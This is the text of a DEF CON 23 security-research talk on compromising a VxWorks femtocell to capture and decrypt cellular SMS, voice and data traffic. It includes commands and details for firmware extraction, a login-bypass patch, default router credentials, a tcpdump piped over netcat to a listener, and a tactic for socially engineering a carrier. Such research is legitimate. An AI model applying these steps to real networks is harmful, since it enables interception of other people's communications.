Build a free cellular traffic capture tool 
with a vxworks based femoto
Hacking Femtocell
Hacking Femtocell 
1
Yuwei Zheng @DEF CON 23
Haoqi Shan    @DEF CON 23
From: 360 Unicorn Team
Main contents
Hacking Femtocell 
• About us
• Why do we need it
• How to get a free Femtocell
• Deeply Hack
• Capture packets
• Summary and Reference
2
About us
Hack Femtocell 
• 360 Unicorn Team
• Radio & Hardware Security Research
• Consists of a group of brilliant security researchers
• Focus on the security of anything that uses radio 
technologies
• RFID, NFC, WSN
• GPS, UAV, Smart Cars, Telecom, SATCOM
• Our primary mission
• Guarantee that Qihoo360 is not vulnerable to any wireless attack
• Qihoo360 protects its users and we protect Qihoo360
• One of the Defcon 23 vendors
• https://www.defcon.org/html/defcon-23/dc-23-vendors.html
3
About me
Hacking Femtocell 
• Yuwei Zheng
• a senior security researcher concentrated in embedded systems
• reversed blackberry BBM, PIN, BIS push mail protocol
• decrypted the RIM network stream successfully in 2011
• finished a MITM attack for blackberry BES
• Haoqi Shan
• a wireless/radio security researcher in Unicorn Team
• obtained bachelor degree of electronic engineering in 2015
• focuses on Wi-Fi penetration, GSM system, router/switcher 
hacking 
4
Why do we need it
Hacking Femtocell 
• Research on products integrated cellular modem
• Capture and hijack
• SMS
• Voice
• Data traffic
5
Why not software-based GSM base station
Hacking Femtocell 
• OpenBTS
• USRP
• GNU Radio
• Why not?
• Data traffic hijack
• Access denied to operator core network
• NO real uplink & downlink SMS hijack
6
Femtocell’s advantages
Hacking Femtocell 
• Access to network operator
• What a hacked Femtocell can do
• SMS and Data traffic
• Capture
• Hijack
• Modify
• Even more…
• Roaming in operator’s network
7
Use Femtocell in research
Hacking Femtocell 
• Cellular modem integrated devices
• Capture or modify control order
• SMS
• 2G
• Capture or modify circle data
• SMS
• 2G
• Trusted data link?
• Find your system vulnerability
8
How to get a free Femtocell 
Hacking Femtocell 
• Can’t be bought?
• Social engineering
• Complains to Customer Service
• Bad network signal 
• Again and again
• Make a complaint to management
• Finally
“Sir, we will set up a femtocell in your home,  I hope 
this device can make your network signal better. ”
9
Let’s hack it
Hacking Femtocell 
• Inside the femtocell
• Home NodeB
• Router with Wi-Fi
• 1 Wan port
• 2 Lan port
• Router configuration page IP
• 192.168.197.1
• Home NodeB configuration page IP
• 192.168.197.241
10
Quick and simple port scan
Hacking Femtocell 
• nmap –sT –sU 192.168.197.241
11
Try to log in
Hacking Femtocell 
• Try telnet/ftp/http/tftp
12
• Seems like VxWorks OS
• Error password again and again?
• Longer and longer time between prompt shows up
• Forget about brute force
Err… it’s VxWorks…
Hacking Femtocell 
• VxWorks
• a real-time operating system developed as proprietary software
• designed for use in embedded systems requiring real-time
• safety and security certification
• for industries, such as aerospace and defense
• medical devices, industrial equipment
• Notable uses
• The Mars Reconnaissance Orbiter
• Northrop Grumman X-47B Unmanned Combat Air System
• Apple Airport Extreme
• Proprietary software
• Well, seems much harder to be hacked than Linux-based 
Femtocell
13
wdbprc(dump memory)
Hacking Femtocell 
• VxWorks system debug interface
• Exploit in metasploit by H.D.Moore
• Failed in use
14
wdbprc(scan version)
Hacking Femtocell 
• Scanner in metasploit by H.D.Moore
• Repaired
15
Dismantling the hardware
Hacking Femtocell 
• Home NodeB
• OMAPL138E
• DSP
• ARM9
• FPGA
• Router
• AR9341
• Router
• Wi-Fi AP
16
Find the UART interface
Hacking Femtocell 
• Hmmm… easy!
17
Use the gift
Hacking Femtocell 
• Interrupt the boot process
• Get more useful information
18
Play with bootshell
Hacking Femtocell 
19
Bootparm
Hacking Femtocell 
• Use `p’ show bootparm
20
What’s inside
Hacking Femtocell 
21
What’s inside
Hacking Femtocell 
• tffs0
• Directory Structure
• common
• configuration file
• user1
• running version VxWorks system and apps
• user2
• last version VxWorks system and apps
• wlanBackup
• router firmware backup files
22
Download the firmware
Hacking Femtocell 
• use tftp port
• Where is it?
• `cp’
• `tftp get’
• One by one
23
Analyze the firmware
Hacking Femtocell 
• use `cp’ command
• cp /tffs0/user1/mpcs.Z host:/ftpforvx/user1/mpcs.Z
• cp /tffs0/blabla host:/blabla
• load kernel by command `l’
24
• mpcs.Z base address 0xc010000
Deflate the kernel image
Hacking Femtocell 
• mpcs.Z
• 《Understanding the bootrom image》
• vxWorks compressed by deflate?
• WindRiver deflate header
• Head magic 05 15 01 00, 4 bytes
• Length , 4 bytes
• Flag 08, 1bytes
• Skip the first 9 bytes, zlib-flate it!
25
Deflate the kernel image
Hacking Femtocell 
• dd if=./mpcs.Z of=./mpcs.deflate ibs=1 obs=1 skip=9
• zlib-flate -uncompress  mpcs.out
• strings mpcs.out | grep –i “copyright”
• Success!
26
Recovery login password
Hacking Femtocell 
• Login init process
• user name
• password hash
27
Recovery login password
Hacking Femtocell 
• Decrypt password hash
• 73l8gRjwLftklgfdXT+MdiMEjJwGPVMsyVxe16iYpk8=
• Base64 encode?
• EF797C8118F02DFB649607DD5D3F8C7623048C9C063D532
CC95C5ED7A898A64F
• I’m feeling lucky
• http://www.hashkiller.co.uk/
• SHA256
• 12345678
• 
• Always try 88888888 12345678 first!
28
Patch it
Hacking Femtocell 
• Not weak password?
• Find the authenticate function
29
Patch it
Hacking Femtocell 
• Bypass login process
• patch the firmware
• zlib compress it
• add vxWorks header number
• download file by ftp
• Hot patch
• Boot shell
• `l’ command unzip and load mpcs.Z
• `m’ command patch
• 0xc0574d64
• DF FF FF 0A -> DF FF FF EA
• BEQ loc_C0574CE8 -> B loc_C0574CE8 
30
vxWorks kernel shell
Hacking Femtocell 
• Log in then debug the kernel
• Lots of tools
• Debug it!
• `func’
• Modify it!
• `mem’
31
Capture data packets
Hacking Femtocell 
• Forward
• telnet router 
• root:5up
• tcpdump -n -i br0 -s 0 -w - host not 192.168.197.104 | netcat 
192.168.197.104 9527 &
• nc -l -v -p 9527 >> sms.pcap
• Listen
• mirror router port
• wireshark
• real-time
32
Capture data packets
Hacking Femtocell 
33
Encrypted?
Hacking Femtocell 
• Read log file, IPSec?
• Find the enc key and auth key
34
Fix protocol port
Hacking Femtocell 
• IPSec
• 500 -> 60295 ISAKMP
• 4500 -> 60296 UDPENCAP
35
Now decrypt it
Hacking Femtocell 
• Edit ESP SAs
• Add uplink and downlink SA separately
36
Wrong protocol
Hacking Femtocell 
• Iu-h protocol?
37
Find the answer
Hacking Femtocell 
• Reverse GSM board firmware
38
Rebuild Wireshark
Hacking Femtocell 
• Write our own dissector?
• Complicated…
• ASN1
• RUA
• RANAP
• Blablabla…
• Analyze packets byte by byte
• Fix the wireshark dissector rules
• Rebuild it!
• Voilà
39
Capture SMS
Hacking Femtocell 
40
Capture voice
Hacking Femtocell 
41
Capture GPRS data
Hacking Femtocell 
42
Capture GPRS data
Hacking Femtocell 
43
Capture your email
Hacking Femtocell 
44
Summary and References
Hacking Femtocell 
• Summary
• VxWorks is not easy to hack
• More mining, more fun
• Wanna know more? Feel free to contact us
• References
•
TRAFFIC INTERCEPTION AND REMOTE MOBILE PHONE CLONING WITH A 
COMPROMISED CDMA  FEMTOCELL -
https://www.nccgroup.trust/globalassets/newsroom/us/blog/docu
ments/2013/femtocell.pdf
• VxWorks Command-Line Tools User's Guide -
http://88.198.249.35/d/VxWorks-Application-Programmer-s-
Guide-6-6.pdf
• VxWorks Application Programmer's Guide, 6.6 –
http://read.pudn.com/downloads149/ebook/646091/vxworks_app
lication_programmers_guide_6.6.pdf
45